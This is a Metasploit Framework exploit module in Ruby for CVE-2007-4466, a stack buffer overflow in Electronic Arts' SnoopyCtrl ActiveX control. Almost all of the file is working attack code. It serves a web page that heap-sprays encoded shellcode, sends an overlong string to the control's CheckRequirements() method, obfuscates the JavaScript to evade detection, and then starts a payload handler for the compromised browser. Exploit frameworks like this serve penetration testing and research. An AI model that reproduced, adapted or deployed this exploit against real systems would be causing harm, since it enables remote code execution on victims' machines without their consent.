##
# $Id: ea_checkrequirements.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Electronic Arts SnoopyCtrl ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Electronic Arts SnoopyCtrl
				ActiveX Control (NPSnpy.dll 1.1.0.36. When sending a overly long
				string to the CheckRequirements() method, an attacker may be able
				to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'CVE', '2007-4466' ],
					[ 'OSVDB', '37723'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]
				],
			'DisclosureDate' => 'Oct 8 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		ret = Rex::Text.uri_encode(Metasm::Shellcode.assemble(Metasm::Ia32.new, "or al, 12").encode_string * 2)

		js = %Q|
			try {
				var evil_string = "";
				var index;
				var vulnerable = new ActiveXObject('SnoopyX.SnoopyCtrl.1');
				var my_unescape = unescape;
				var shellcode = '#{shellcode}';
				#{js_heap_spray}
				sprayHeap(my_unescape(shellcode), 0x0c0c0c0c, 0x40000);
				for (index = 0; index < 5000; index++) {
					evil_string = evil_string + my_unescape('#{ret}');
				}
				vulnerable.CheckRequirements(evil_string);
			} catch( e ) { window.location = 'about:blank' ; }
		|

		opts = {
			'Strings' => true,
			'Symbols' => {
				'Variables' => [
					'vulnerable',
					'shellcode',
					'my_unescape',
					'index',
					'evil_string',
				]
			}
		}
		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
		js.update_opts(js_heap_spray.opts)
		js.obfuscate()
		content = %Q|<html>
<body>
<script><!--
#{js}
//</script>
</body>
</html>
|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end